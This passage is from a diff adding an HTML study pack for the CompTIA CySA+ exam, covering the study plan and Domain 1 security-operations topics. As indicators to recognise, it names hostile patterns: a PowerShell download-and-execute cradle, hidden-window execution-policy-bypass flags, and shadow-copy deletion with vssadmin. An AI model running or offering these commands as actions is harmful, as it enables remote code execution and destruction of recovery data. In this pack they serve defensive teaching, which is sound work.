@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CySA+ (CS0-003) Offline Study Pack</title>
+<style>
+:root{--bg:#fbfaf8;--fg:#22201d;--muted:#6b655d;--line:#e2ded6;--accent:#8a4b2a;
+--code-bg:#f2efe9;--card:#fff;}
+@media (prefers-color-scheme:dark){:root{--bg:#16151a;--fg:#e6e2db;--muted:#9a938a;
+--line:#2e2b33;--accent:#d59a6a;--code-bg:#1f1d24;--card:#1b1a20;}}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);
+font:16px/1.65 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}
+#wrap{display:flex;min-height:100vh}
+nav{width:260px;flex:0 0 260px;border-right:1px solid var(--line);padding:24px 16px;
+position:sticky;top:0;height:100vh;overflow-y:auto;background:var(--card)}
+nav h2{font-size:12px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);margin:0 0 12px}
+nav a{display:block;padding:7px 10px;border-radius:6px;color:var(--fg);text-decoration:none;font-size:14px}
+nav a:hover{background:var(--code-bg)}
+main{flex:1;min-width:0;padding:40px 32px 120px;max-width:900px;margin:0 auto}
+h1{font-size:1.9rem;line-height:1.25;margin:0 0 .6em;padding-bottom:.3em;border-bottom:2px solid var(--accent)}
+h2{font-size:1.4rem;margin:2em 0 .6em;padding-bottom:.25em;border-bottom:1px solid var(--line)}
+h3{font-size:1.15rem;margin:1.6em 0 .5em;color:var(--accent)}
+h4{font-size:1rem;margin:1.3em 0 .4em}
+a{color:var(--accent)}
+code{background:var(--code-bg);padding:.12em .35em;border-radius:4px;
+font:.87em/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:var(--code-bg);padding:14px 16px;border-radius:8px;overflow-x:auto;
+border:1px solid var(--line)}
+pre code{background:none;padding:0;font-size:.85rem;line-height:1.55}
+.tw{overflow-x:auto;margin:1.1em 0}
+table{border-collapse:collapse;width:100%;font-size:.92rem}
+th,td{border:1px solid var(--line);padding:8px 11px;text-align:left;vertical-align:top}
+th{background:var(--code-bg);font-weight:600}
+blockquote{margin:1.1em 0;padding:.6em 1em;border-left:3px solid var(--accent);
+background:var(--code-bg);border-radius:0 6px 6px 0;color:var(--muted)}
+hr{border:0;border-top:1px solid var(--line);margin:2.4em 0}
+ul,ol{padding-left:1.5em}
+li{margin:.3em 0}
+.section{scroll-margin-top:20px}
+.toggle{display:none;position:fixed;top:12px;left:12px;z-index:10;background:var(--card);
+color:var(--fg);border:1px solid var(--line);border-radius:6px;padding:8px 12px;font-size:14px}
+@media(max-width:820px){
+  nav{display:none;position:fixed;z-index:9;width:80%;max-width:300px}
+  nav.open{display:block}
+  .toggle{display:block}
+  main{padding:64px 16px 100px}
+}
+@media print{nav,.toggle{display:none}main{max-width:none;padding:0}}
+</style>
+</head><body>
+<button class="toggle" aria-label="Toggle contents">&#9776; Contents</button>
+<div id="wrap">
+<nav><h2>Contents</h2><a href="#readme">Overview</a><a href="#study-plan">Study Plan</a><a href="#01-security-operations">1. Security Operations</a><a href="#02-vulnerability-management">2. Vulnerability Management</a><a href="#03-incident-response">3. Incident Response</a><a href="#04-reporting-communication">4. Reporting &amp; Communication</a><a href="#frameworks">Frameworks</a><a href="#commands-cheatsheet">Command Cheatsheet</a><a href="#tools-reference">Tools Reference</a><a href="#acronyms">Acronyms</a><a href="#flashcards">Flashcards</a></nav>
+<main><section class="section" id="readme"><h1 id="comptia-cysa-cs0-003-offline-study-pack">CompTIA CySA+ (CS0-003) — Offline Study Pack</h1>
+<p>Self-contained study material for the CompTIA Cybersecurity Analyst (CySA+) exam. Everything here is plain Markdown with <strong>no external links required</strong> — clone once, read anywhere, no connection needed.</p>
+<blockquote><strong>Note on sources.</strong> This pack is written from the publicly published CS0-003 exam objectives and general security-domain knowledge. It is <em>not</em> a copy of CompTIA&#x27;s CertMaster course, and it is not a substitute for your licensed course material. Cross-check the domain/objective numbering against the free official objectives PDF from CompTIA when you next have a connection.</blockquote>
+<h2 id="exam-at-a-glance">Exam at a glance</h2>
+<div class="tw"><table><thead><tr><th>Item</th><th>Value</th></tr></thead><tbody><tr><td>Exam code</td><td>CS0-003</td></tr><tr><td>Questions</td><td>Max 85 (multiple choice + performance-based)</td></tr><tr><td>Time</td><td>165 minutes</td></tr><tr><td>Passing score</td><td>750 (scale 100–900)</td></tr><tr><td>Recommended experience</td><td>4+ years hands-on IR / security analyst work</td></tr><tr><td>Prerequisite</td><td>None formally; Security+ and Network+ knowledge assumed</td></tr></tbody></table></div>
+<h2 id="domains-and-weighting">Domains and weighting</h2>
+<div class="tw"><table><thead><tr><th>#</th><th>Domain</th><th>Weight</th><th>File</th></tr></thead><tbody><tr><td>1</td><td>Security Operations</td><td>33%</td><td><a href="#01-security-operations"><code>01-security-operations.md</code></a></td></tr><tr><td>2</td><td>Vulnerability Management</td><td>30%</td><td><a href="#02-vulnerability-management"><code>02-vulnerability-management.md</code></a></td></tr><tr><td>3</td><td>Incident Response and Management</td><td>20%</td><td><a href="#03-incident-response"><code>03-incident-response.md</code></a></td></tr><tr><td>4</td><td>Reporting and Communication</td><td>17%</td><td><a href="#04-reporting-communication"><code>04-reporting-communication.md</code></a></td></tr></tbody></table></div>
+<h2 id="supporting-references">Supporting references</h2>
+<ul>
+<li><a href="#acronyms"><code>acronyms.md</code></a> — every acronym the exam expects you to expand</li>
+<li><a href="#tools-reference"><code>tools-reference.md</code></a> — what each named tool does and when an analyst reaches for it</li>
+<li><a href="#commands-cheatsheet"><code>commands-cheatsheet.md</code></a> — the CLI you must be able to read under time pressure</li>
+<li><a href="#flashcards"><code>flashcards.md</code></a> — Q/A drill deck, one fact per line</li>
+<li><a href="#frameworks"><code>frameworks.md</code></a> — kill chain, Diamond Model, ATT&amp;CK, OWASP, and friends side by side</li>
+<li><a href="#study-plan"><code>study-plan.md</code></a> — a 6-week schedule with checkpoints</li>
+</ul>
+<h2 id="reading-it-offline">Reading it offline</h2>
+<p><strong>In Noted (this repo&#x27;s app):</strong> these are ordinary <code>.md</code> files. Open the desktop app and use <em>File → Import</em> on any of them, or point the mobile app&#x27;s storage directory at <code>study/cysa-plus/</code>.</p>
+<p><strong>Single-file HTML:</strong> run <code>python study/cysa-plus/build_offline_html.py</code> to bundle everything into <code>cysa-offline.html</code> — one file, no CDN, no JavaScript dependencies, opens in any browser on a plane.</p>
+<p><strong>On a phone:</strong> <code>git clone</code> the repo once over Wi-Fi; every file is text and the whole pack is well under a megabyte.</p>
+<h2 id="how-to-use-this-pack">How to use this pack</h2>
+<ol>
+<li>Read the domain file end to end once, slowly. Don&#x27;t take notes yet.</li>
+<li>Re-read with <code>flashcards.md</code> open; anything you can&#x27;t answer cold, mark it.</li>
+<li>Drill the marked cards daily until they&#x27;re automatic.</li>
+<li>Performance-based questions (PBQs) are where people lose time — practise reading log excerpts and <code>nmap</code>/<code>tcpdump</code> output from <code>commands-cheatsheet.md</code> until parsing them is reflexive.</li>
+</ol>
+<h2 id="exam-day-mechanics-worth-knowing">Exam-day mechanics worth knowing</h2>
+<ul>
+<li>PBQs cluster at the <strong>start</strong>. Flag and skip them; bank the multiple-choice points first, then return with whatever time is left.</li>
+<li>CySA+ is an <em>analyst</em> exam, not a <em>tool operator</em> exam. When two answers both look technically right, pick the one that reflects better <strong>process</strong> (escalate, document, preserve evidence, validate before acting).</li>
+<li>&quot;First/next/best&quot; in the stem is doing work. Read it twice.</li>
+</ul></section><section class="section" id="study-plan"><h1 id="six-week-cysa-study-plan">Six-Week CySA+ Study Plan</h1>
+<p>Assumes ~8–10 hours per week. Adjust the calendar, keep the sequence.</p>
+<h2 id="week-1-foundations-and-security-operations-part-1">Week 1 — Foundations and Security Operations, part 1</h2>
+<ul>
+<li>Read <code>01-security-operations.md</code> sections 1.1 and 1.2 twice.</li>
+<li>Build the logging table from memory on blank paper.</li>
+<li>Drill: Windows Event IDs, Sysmon event IDs, order of volatility.</li>
+<li><strong>Checkpoint:</strong> can you list five host indicators and five network indicators and explain what each usually means?</li>
+</ul>
+<h2 id="week-2-security-operations-part-2">Week 2 — Security Operations, part 2</h2>
+<ul>
+<li>Read sections 1.3–1.5.</li>
+<li>Work through <code>commands-cheatsheet.md</code>: run every nmap and tcpdump command in a lab (or read output samples until parsing them is automatic).</li>
+<li>Practise reading an email header top to bottom.</li>
+<li><strong>Checkpoint:</strong> explain SPF vs DKIM vs DMARC without notes. Explain the Pyramid of Pain and why TTP-level detection matters.</li>
+</ul>
+<h2 id="week-3-vulnerability-management-part-1">Week 3 — Vulnerability Management, part 1</h2>
+<ul>
+<li>Read <code>02-vulnerability-management.md</code> sections 2.1–2.3.</li>
+<li>Memorise the CVSS v3.1 base metrics and practise reading vectors until you can estimate severity from the string alone.</li>
+<li>Drill: scan types and their trade-offs; true/false positive/negative.</li>
+<li><strong>Checkpoint:</strong> given a scanner finding, can you argue whether it&#x27;s a false positive and what you&#x27;d do to validate?</li>
+</ul>
+<h2 id="week-4-vulnerability-management-part-2">Week 4 — Vulnerability Management, part 2</h2>
+<ul>
+<li>Read sections 2.4–2.5.</li>
+<li>Memorise the vulnerability classes and their <em>specific</em> mitigations — the exam wants &quot;parameterised queries&quot;, not &quot;validate input&quot;.</li>
+<li>Drill: inhibitors to remediation, compensating controls, risk responses.</li>
+<li><strong>Checkpoint:</strong> explain the full vulnerability management lifecycle and name the step people skip (verification).</li>
+</ul>
+<h2 id="week-5-incident-response">Week 5 — Incident Response</h2>
+<ul>
+<li>Read <code>03-incident-response.md</code> fully.</li>
+<li>Memorise: order of volatility, NIST 800-61 phases, chain of custody elements.</li>
+<li>Compare the frameworks using <code>frameworks.md</code> until you can say when each fits.</li>
+<li><strong>Checkpoint:</strong> walk through a ransomware incident end to end, naming your first three actions and justifying the containment choice.</li>
+</ul>
+<h2 id="week-6-reporting-review-and-exam-prep">Week 6 — Reporting, review, and exam prep</h2>
+<ul>
+<li>Read <code>04-reporting-communication.md</code>.</li>
+<li>Full pass through <code>flashcards.md</code>; mark and re-drill every miss.</li>
+<li>Take timed practice exams. Review <strong>every</strong> question you got right for the wrong reason as well as every miss.</li>
+<li>Re-read the self-check questions at the end of each domain file.</li>
+<li><strong>Checkpoint:</strong> consistently scoring above 80% on practice exams.</li>
+</ul>
+<hr>
+<h2 id="ongoing-daily-habits">Ongoing daily habits</h2>
+<ul>
+<li>15 minutes of flashcards, every day, no exceptions. Spacing beats cramming.</li>
+<li>Read one real incident write-up or threat report a week and map it to ATT&amp;CK.</li>
+<li>Say answers out loud. If you can&#x27;t explain it in a sentence, you don&#x27;t have it.</li>
+</ul>
+<h2 id="the-week-before">The week before</h2>
+<ul>
+<li>Stop learning new material three days out; consolidate only.</li>
+<li>Re-drill acronyms, CVSS metrics, event IDs, order of volatility, and GDPR&#x27;s 72 hours — the pure-recall items that are free marks.</li>
+<li>Sleep. Tired pattern-matching is the main cause of avoidable misses on PBQs.</li>
+</ul>
+<h2 id="exam-day-approach">Exam-day approach</h2>
+<ol>
+<li>Flag and skip the PBQs on the first pass — they&#x27;re front-loaded and they eat time. Bank the multiple-choice points first.</li>
+<li>On multiple choice, eliminate two answers before choosing between the rest.</li>
+<li>When two answers are technically correct, pick the one showing better <strong>process</strong>: validate, document, preserve, escalate.</li>
+<li>Watch for &quot;first&quot;, &quot;next&quot;, &quot;best&quot;, &quot;most likely&quot;, and &quot;least&quot; — they reverse or reorder the answer.</li>
+<li>Budget roughly 90 seconds per multiple-choice question, leaving ~45 minutes for the PBQs and review.</li>
+</ol></section><section class="section" id="01-security-operations"><h1 id="domain-1-security-operations-33">Domain 1 — Security Operations (33%)</h1>
+<p>The largest domain. It covers what you look at, what &quot;bad&quot; looks like, and how you make the looking repeatable.</p>
+<hr>
+<h2 id="1-1-system-and-network-architecture-concepts">1.1 System and network architecture concepts</h2>
+<h3 id="logging-the-analyst-s-raw-material">Logging — the analyst&#x27;s raw material</h3>
+<div class="tw"><table><thead><tr><th>Source</th><th>What it proves</th><th>Watch for</th></tr></thead><tbody><tr><td><strong>Windows Event Log</strong></td><td>Auth, process creation, service installs</td><td>4624 logon, 4625 failed logon, 4688 process create, 4672 special privileges, 7045 service install</td></tr><tr><td><strong>Sysmon</strong></td><td>Deep process/network/file telemetry</td><td>Event ID 1 (process create with hashes + command line), 3 (network connect), 7 (image load), 8 (CreateRemoteThread), 11 (file create), 22 (DNS query)</td></tr><tr><td><strong>Syslog</strong> (RFC 5424)</td><td>Unix/network device events</td><td>Facility + severity 0–7; severity 0 = emergency, 7 = debug</td></tr><tr><td><strong>Firewall / NGFW</strong></td><td>Allow/deny by 5-tuple</td><td>Egress denies are more interesting than ingress denies</td></tr><tr><td><strong>Proxy / web filter</strong></td><td>Full URL, user agent, bytes</td><td>Long POST bodies to rare domains = exfil</td></tr><tr><td><strong>DNS</strong></td><td>Every name resolution</td><td>NXDOMAIN storms, long labels, high-entropy subdomains</td></tr><tr><td><strong>NetFlow / IPFIX</strong></td><td>Who talked to whom, how much, how long</td><td>No payload — volume and timing only</td></tr><tr><td><strong>EDR</strong></td><td>Process trees, parent-child lineage</td><td>The single richest host source</td></tr></tbody></table></div>
+<p><strong>Key distinctions the exam tests:</strong></p>
+<ul>
+<li><strong>NetFlow</strong> = metadata (5-tuple + counters). <strong>Full packet capture</strong> = payload. Flow scales; pcap does not. You keep flow for months, pcap for days.</li>
+<li><strong>Logging levels</strong> trade fidelity for volume. Debug logging in production is a storage and privacy problem, not a security win.</li>
+<li><strong>Time synchronisation (NTP)</strong> is non-negotiable. Correlating three sources with skewed clocks produces a false timeline — and a timeline is evidence.</li>
+<li><strong>Log retention</strong> is driven by regulation (PCI DSS: 1 year, 3 months immediately available) and by dwell time — if attackers sit undetected for 200 days, 30-day retention means you can never reconstruct the intrusion.</li>
+</ul>
+<h3 id="operating-system-concepts">Operating system concepts</h3>
+<ul>
+<li><strong>Windows Registry</strong> — configuration <em>and</em> persistence. Autorun keys: <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>, <code>RunOnce</code>, <code>HKLM\SYSTEM\CurrentControlSet\Services</code>, and Winlogon <code>Shell</code>/<code>Userinit</code>.</li>
+<li><strong>System hardening</strong> — remove what you don&#x27;t need before you defend what&#x27;s left. Disable unused services, close ports, remove default accounts, apply a benchmark (CIS, DISA STIG).</li>
+<li><strong>File structure / permissions</strong> — Linux <code>rwx</code> octal, <code>setuid</code>/<code>setgid</code> (a <code>setuid root</code> binary in a user-writable directory is a privesc waiting to happen), Windows ACLs and inheritance.</li>
+<li><strong>Configuration file locations</strong> — <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/etc/crontab</code>, <code>~/.ssh/authorized_keys</code>, <code>/var/log/auth.log</code>.</li>
+<li><strong>Processes and services</strong> — a service running as SYSTEM with a binary path in a writable folder is <em>unquoted service path</em> privesc.</li>
+<li><strong>Hardware architecture</strong> — TPM (sealed key storage, measured boot), HSM (tamper-resistant key operations), Secure Boot, UEFI vs legacy BIOS.</li>
+</ul>
+<h3 id="infrastructure-concepts">Infrastructure concepts</h3>
+<ul>
+<li><strong>Serverless</strong> — no OS to patch, but you inherit function-level IAM risk and dependency risk. The blast radius is the function&#x27;s role.</li>
+<li><strong>Virtualisation</strong> — hypervisor Type 1 (bare metal) vs Type 2 (hosted). The nightmare case is <strong>VM escape</strong>: guest → hypervisor → every other guest.</li>
+<li><strong>Containerisation</strong> — shared kernel means a kernel exploit crosses container boundaries. Image provenance and registry signing matter more than in VMs.</li>
+<li><strong>On-prem vs cloud vs hybrid</strong> — the <strong>shared responsibility model</strong> decides who patches what. IaaS: you patch the OS. PaaS: provider does. SaaS: you own only configuration and data.</li>
+</ul>
+<h3 id="network-architecture">Network architecture</h3>
+<ul>
+<li><strong>Segmentation</strong> — the single highest-value control against lateral movement. Flat networks turn one compromised laptop into domain-wide compromise.</li>
+<li><strong>Zero trust</strong> — never trust, always verify. <strong>Policy Decision Point (PDP)</strong> decides; <strong>Policy Enforcement Point (PEP)</strong> enforces. Identity replaces network location as the perimeter.</li>
+<li><strong>SDN</strong> — control plane separated from data plane; policy pushed centrally.</li>
+<li><strong>SASE</strong> — network + security delivered as a cloud edge service.</li>
+<li><strong>Secured zones</strong> — screened subnet (DMZ), jump box/bastion for admin access, air gap for the truly sensitive.</li>
+<li><strong>VPN</strong> — site-to-site vs remote access; <strong>split tunnel</strong> sends only corporate traffic through the VPN (faster, less visibility) vs <strong>full tunnel</strong> (all traffic inspected, more load).</li>
+</ul>
+<h3 id="identity-and-access-management">Identity and access management</h3>
+<ul>
+<li><strong>MFA</strong> — something you know / have / are. Push fatigue is a real attack; number matching and FIDO2 hardware tokens resist it. SMS OTP is the weakest common factor (SIM swap, SS7).</li>
+<li><strong>SSO</strong> — one authentication, many services. <strong>SAML</strong> (XML assertions, enterprise web SSO), <strong>OAuth 2.0</strong> (authorisation delegation, <em>not</em> authentication), <strong>OpenID Connect</strong> (authentication layer on top of OAuth).</li>
+<li><strong>Federation</strong> — trust relationship across organisational boundaries.</li>
+<li><strong>Privileged access management (PAM)</strong> — vaulted credentials, session recording, just-in-time elevation, automatic rotation.</li>
+<li><strong>Passwordless</strong> — FIDO2/WebAuthn; phishing-resistant because the credential is origin-bound.</li>
+<li><strong>Cloud access security broker (CASB)</strong> — policy enforcement point between users and cloud services; discovers shadow IT.</li>
+</ul>
+<h3 id="encryption-and-sensitive-data-protection">Encryption and sensitive data protection</h3>
+<ul>
+<li><strong>Public key infrastructure (PKI)</strong> — CA, RA, CRL, OCSP. Certificate pinning breaks MITM inspection (and breaks your proxy).</li>
+<li><strong>SSL/TLS inspection</strong> — you must decrypt to inspect, which creates a privacy and compliance obligation and a single point of interception.</li>
+<li><strong>Data loss prevention (DLP)</strong> — at rest, in transit, in use. Detection by pattern (regex), fingerprint (exact document match), or classification label.</li>
+<li><strong>Personally identifiable information (PII) / protected health information (PHI) / cardholder data (CHD)</strong> — know which regime governs which: GDPR → personal data, HIPAA → PHI, PCI DSS → CHD.</li>
+<li><strong>Data masking / tokenisation / de-identification</strong> — tokenisation replaces the value with a reference; masking obscures part of it; encryption is reversible with a key.</li>
+</ul>
+<hr>
+<h2 id="1-2-analysing-indicators-of-potentially-malicious-activity">1.2 Analysing indicators of potentially malicious activity</h2>
+<h3 id="network-related-indicators">Network-related indicators</h3>
+<div class="tw"><table><thead><tr><th>Indicator</th><th>What it usually means</th></tr></thead><tbody><tr><td>Bandwidth consumption spike (outbound)</td><td>Data exfiltration or DDoS participation</td></tr><tr><td>Beaconing — regular interval callbacks</td><td>C2 channel. Look for low <strong>jitter</strong> and consistent byte counts</td></tr><tr><td>Irregular peer-to-peer communication</td><td>Lateral movement; workstations should rarely talk to each other</td></tr><tr><td>Rogue device on the network</td><td>Unmanaged asset, possible pivot point</td></tr><tr><td>Scan / sweep</td><td>Reconnaissance — internal scans are far more alarming than external</td></tr><tr><td>Unusual traffic spike</td><td>Could be legitimate; correlate with change tickets first</td></tr><tr><td>Activity on unexpected ports</td><td>Tunnelling — SSH on 443, DNS on 53 carrying non-DNS payloads</td></tr><tr><td>Non-standard port usage</td><td>Protocol/port mismatch is a strong signal</td></tr></tbody></table></div>
+<p><strong>Beaconing detection:</strong> compute the interval between successive connections from one host to one destination. Malware C2 shows tight clustering (e.g. every 60s ±5s). Legitimate software (update checkers) beacons too — the discriminator is destination reputation, not periodicity alone.</p>
+<h3 id="host-related-indicators">Host-related indicators</h3>
+<ul>
+<li><strong>Processor consumption</strong> — sustained 100% CPU on an idle workstation: cryptomining is the usual suspect.</li>
+<li><strong>Memory consumption</strong> — memory-resident (fileless) malware lives here and leaves nothing on disk.</li>
+<li><strong>Drive capacity consumption</strong> — staging area for exfil, often a <code>.rar</code>/<code>.7z</code> archive in <code>C:\Windows\Temp</code> or <code>%APPDATA%</code>.</li>
+<li><strong>Unauthorised software</strong> — RATs, remote-access tools (AnyDesk, TeamViewer) installed outside a change window.</li>
+<li><strong>Malicious processes</strong> — the tell is <strong>lineage</strong>, not name. <code>winword.exe → cmd.exe → powershell.exe</code> is malicious regardless of what the binary is called. A <code>svchost.exe</code> whose parent is not <code>services.exe</code> is masquerading.</li>
+<li><strong>Unauthorised changes / privileges</strong> — new local admin, new service, new scheduled task, modified registry autorun.</li>
+<li><strong>Data exfiltration</strong> — large outbound transfers, especially to cloud storage or newly registered domains.</li>
+<li><strong>Abnormal OS process behaviour</strong> — <code>lsass.exe</code> being <em>read</em> by another process is credential dumping (Mimikatz).</li>
+<li><strong>File system changes / anomalies</strong> — mass rename with a new extension = ransomware in progress; shadow copy deletion (<code>vssadmin delete shadows</code>) is the precursor.</li>
+<li><strong>Registry changes / anomalies</strong> — persistence, defence evasion (disabling Defender via registry policy).</li>
+<li><strong>Unauthorised scheduled tasks</strong> — <code>schtasks /create</code> running from a temp path.</li>
+</ul>
+<h3 id="application-related-indicators">Application-related indicators</h3>
+<ul>
+<li><strong>Anomalous activity</strong> — an app making outbound connections it has never made.</li>
+<li><strong>Introduction of new accounts</strong> — especially service accounts with interactive logon rights.</li>
+<li><strong>Unexpected output</strong> — SQL errors leaking schema, stack traces to users.</li>
+<li><strong>Unexpected outbound communication</strong> — a database server initiating internet connections should never happen.</li>
+<li><strong>Service interruption</strong> — could be DoS, could be the attacker disabling logging or AV.</li>
+<li><strong>Application logs</strong> — HTTP 500 bursts, authentication failures, unusual user agents, very long query strings (injection attempts).</li>
+</ul>
+<h3 id="other-indicators">Other indicators</h3>
+<ul>
+<li><strong>Social engineering attacks</strong> — pretexting, phishing, vishing, smishing, BEC.</li>
+<li><strong>Obfuscated links</strong> — URL shorteners, homoglyph/punycode domains (<code>раypal.com</code> with a Cyrillic а), open redirects on trusted domains.</li>
+</ul>
+<hr>
+<h2 id="1-3-tools-and-techniques-for-determining-malicious-activity">1.3 Tools and techniques for determining malicious activity</h2>
+<h3 id="packet-capture">Packet capture</h3>
+<ul>
+<li><strong>Wireshark</strong> — GUI analysis. <code>Follow TCP Stream</code> reconstructs a conversation; <code>Statistics → Conversations</code> finds the top talkers; <code>Export Objects</code> pulls transferred files out of a capture.</li>
+<li><strong>tcpdump</strong> — capture on headless boxes. Always write to a file (<code>-w</code>) and analyse later; analysing live drops packets.</li>
+<li><strong>WireEdit / Network Miner</strong> — extract artefacts and reassemble sessions.</li>
+</ul>
+<h3 id="log-analysis-and-correlation">Log analysis and correlation</h3>
+<ul>
+<li><strong>SIEM</strong> — aggregation, normalisation, correlation, alerting. The value is <em>correlation across sources</em>, not storage.</li>
+<li><strong>Rule writing</strong> — a rule that fires 400 times a day is a rule nobody reads. Tune to the environment, then tune again.</li>
+<li><strong>Search languages</strong> — Splunk SPL, Elastic KQL/Lucene, Sentinel KQL.</li>
+<li><strong>Sigma</strong> — vendor-neutral detection rule format; converts to whatever your SIEM speaks.</li>
+</ul>
+<h3 id="endpoint">Endpoint</h3>
+<ul>
+<li><strong>EDR</strong> — process trees, isolate-host action, retrospective search.</li>
+<li><strong>Reputation analysis</strong> — hash lookups (VirusTotal), file/IP/domain scoring.</li>
+<li><strong>File analysis</strong> — static (strings, PE headers, imports, entropy) vs dynamic (execute and observe).</li>
+<li><strong>Sandboxing</strong> — detonate in isolation. Modern malware is <strong>sandbox-aware</strong>: it checks for VM artefacts, low core counts, no mouse movement, and sleeps past the analysis window.</li>
+</ul>
+<h3 id="network">Network</h3>
+<ul>
+<li><strong>DNS and IP reputation</strong> — WHOIS age (a domain registered yesterday is suspicious), AbuseIPDB-style scoring.</li>
+<li><strong>DGA (domain generation algorithm)</strong> detection — high-entropy names, NXDOMAIN floods as malware cycles through candidates.</li>
+<li><strong>Flow analysis</strong> — long-duration, low-bandwidth sessions are the classic C2 shape.</li>
+</ul>
+<h3 id="email-analysis">Email analysis</h3>
+<div class="tw"><table><thead><tr><th>Header / control</th><th>What it tells you</th></tr></thead><tbody><tr><td><strong>SPF</strong></td><td>Is the sending IP authorised for that domain? Checks the envelope sender</td></tr><tr><td><strong>DKIM</strong></td><td>Cryptographic signature — was the message altered in transit?</td></tr><tr><td><strong>DMARC</strong></td><td>Policy (<code>none</code>/<code>quarantine</code>/<code>reject</code>) + alignment + reporting. Ties SPF/DKIM to the <em>visible</em> From header</td></tr><tr><td><strong>Received:</strong> chain</td><td>Read <strong>bottom to top</strong> — the bottom-most is the origin</td></tr><tr><td><strong>Reply-To mismatch</strong></td><td>Classic BEC tell: From looks internal, Reply-To is external</td></tr><tr><td><strong>Message ID / X-headers</strong></td><td>Sending infrastructure fingerprint</td></tr><tr><td><strong>Embedded links</strong></td><td>Check the <em>href</em>, not the display text</td></tr><tr><td><strong>Attachments</strong></td><td>Macro-enabled Office, ISO/IMG (bypasses mark-of-the-web), double extensions</td></tr></tbody></table></div>
+<p><strong>Impersonation techniques:</strong> display-name spoofing, lookalike domains (<code>rnicrosoft.com</code>), compromised legitimate accounts (hardest to detect — SPF and DKIM both pass).</p>
+<h3 id="programming-and-scripting-for-analysts">Programming and scripting for analysts</h3>
+<p>You are not expected to write production code, but you must <strong>read</strong> it:</p>
+<ul>
+<li><strong>Python</strong> — the automation default; <code>requests</code>, <code>pandas</code>, <code>re</code> for log parsing.</li>
+<li><strong>PowerShell</strong> — both the admin tool and the attacker&#x27;s tool. Recognise <code>-EncodedCommand</code> (base64), <code>-nop -w hidden -ExecutionPolicy Bypass</code>, <code>IEX (New-Object Net.WebClient).DownloadString(...)</code> — that last one is a download-and-execute cradle, memorise it.</li>
+<li><strong>Shell / Bash</strong> — pipeline literacy: <code>grep | awk | sort | uniq -c | sort -rn</code> is the analyst&#x27;s most-used idiom.</li>
+<li><strong>Regular expressions</strong> — extracting IPs, hashes, and domains from log text.</li>
+<li><strong>JSON / XML</strong> — every modern API and log format.</li>
+</ul>
+<hr>
+<h2 id="1-4-threat-intelligence-and-threat-hunting">1.4 Threat intelligence and threat hunting</h2>
+<h3 id="intelligence-fundamentals">Intelligence fundamentals</h3>
+<ul>
+<li><strong>Levels:</strong> <em>strategic</em> (board-level, risk trends), <em>operational</em> (campaigns, actor intent), <em>tactical</em> (TTPs, immediately actionable).</li>
+<li><strong>Confidence levels</strong> — never treat a feed as fact. Use the <strong>Admiralty Code</strong> (source reliability A–F, information credibility 1–6).</li>
+<li><strong>Indicator lifecycle</strong> — IOCs decay. An IP burns in days; a TTP lasts years. This is the <strong>Pyramid of Pain</strong>: hash values → IP addresses → domain names → network/host artefacts → tools → <strong>TTPs</strong>. The higher you detect, the more it costs the adversary to adapt.</li>
+</ul>
+<h3 id="collection-sources">Collection sources</h3>
+<ul>
+<li><strong>Open source (OSINT)</strong> — free, broad, noisy.</li>
+<li><strong>Closed / proprietary</strong> — paid feeds, vetted, timelier.</li>
+<li><strong>ISAC</strong> (Information Sharing and Analysis Center) — sector-specific (FS-ISAC for finance, H-ISAC for health).</li>
+<li><strong>Internal telemetry</strong> — your own past incidents are your highest-fidelity feed.</li>
+</ul>
+<h3 id="sharing-standards">Sharing standards</h3>
+<ul>
+<li><strong>STIX</strong> — the <em>language</em> for describing threat information (objects, relationships).</li>
+<li><strong>TAXII</strong> — the <em>transport</em> that moves STIX around.</li>
+<li><strong>MISP</strong> — an open sharing platform.</li>
+<li><strong>Traffic Light Protocol (TLP):</strong></li>
+<li><code>TLP:RED</code> — named recipients only</li>
+<li><code>TLP:AMBER</code> — recipient&#x27;s organisation, need-to-know (<code>AMBER+STRICT</code> = org only)</li>
+<li><code>TLP:GREEN</code> — the community, not public</li>
+<li><code>TLP:CLEAR</code> — unrestricted Handling TLP correctly is exam-favourite material.</li>
+</ul>
+<h3 id="threat-actors">Threat actors</h3>
+<div class="tw"><table><thead><tr><th>Actor</th><th>Motivation</th><th>Sophistication</th></tr></thead><tbody><tr><td>Nation-state / APT</td><td>Espionage, disruption</td><td>Very high; long dwell time, custom tooling</td></tr><tr><td>Organised crime</td><td>Financial</td><td>High; ransomware, RaaS affiliates</td></tr><tr><td>Hacktivist</td><td>Ideological</td><td>Variable; defacement, DDoS, leaks</td></tr><tr><td>Insider</td><td>Grievance, money, or accident</td><td>Low technical, high access</td></tr><tr><td>Script kiddie</td><td>Notoriety</td><td>Low; known exploits, off-the-shelf tools</td></tr><tr><td>Supply chain</td><td>Varies</td><td>Access through a trusted third party</td></tr></tbody></table></div>
+<h3 id="threat-hunting">Threat hunting</h3>
+<p>Hunting is <strong>hypothesis-driven</strong> and <strong>proactive</strong> — it starts <em>without</em> an alert. That distinction is the exam&#x27;s favourite hunting question.</p>
+<ol>
+<li>Form a hypothesis (&quot;if an adversary used Kerberoasting, I&#x27;d see TGS requests with RC4 encryption for service accounts&quot;).</li>
+<li>Decide the data required and confirm you actually collect it.</li>
+<li>Hunt — query, pivot, correlate.</li>
+<li>Outcome is a win either way: you find evidence, <strong>or</strong> you find a visibility gap, <strong>or</strong> you produce a new detection rule.</li>
+</ol>
+<p><strong>Concepts:</strong> <em>focus on critical assets</em> first; <em>bundling critical assets into protection groups</em>; <em>attack vectors</em>; <em>integrated intelligence</em>; <em>improving detection capabilities</em> is the real deliverable — a hunt that finds nothing but produces a durable detection was still successful.</p>
+<hr>
+<h2 id="1-5-efficiency-and-process-improvement">1.5 Efficiency and process improvement</h2>
+<h3 id="standardising-processes">Standardising processes</h3>
+<ul>
+<li><strong>Identification of tasks suitable for automation</strong> — repeatable, high-volume, low-judgement, well-defined inputs. Enrichment, ticket creation, and IOC lookups qualify. Containment decisions on production systems do not, at least not without approval gating.</li>
+<li><strong>Team coordination</strong> — a documented, repeatable process means results don&#x27;t depend on which analyst caught the ticket.</li>
+</ul>
